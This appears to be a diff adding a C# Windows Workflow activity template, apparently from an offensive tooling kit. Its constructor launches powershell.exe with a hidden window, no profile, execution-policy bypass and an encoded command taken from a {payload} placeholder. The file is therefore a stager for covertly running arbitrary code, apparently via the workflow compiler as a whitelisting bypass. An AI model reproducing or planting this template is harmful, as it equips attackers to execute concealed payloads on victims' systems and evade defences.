@@ -1,0 +1,14 @@
+using System;
+using System.Diagnostics;
+using System.Workflow.Activities;
+ 
+public class Foo : SequentialWorkflowActivity {{
+      public Foo() {{
+          Process process = new Process();
+          process.StartInfo.FileName = "powershell.exe";
+          process.StartInfo.Arguments = "-WindowStyle Hidden -NoP -NoLogo -exec Bypass -enc {payload}";
+          process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
+          process.Start();
+          process.WaitForExit();
+      }}
+}}
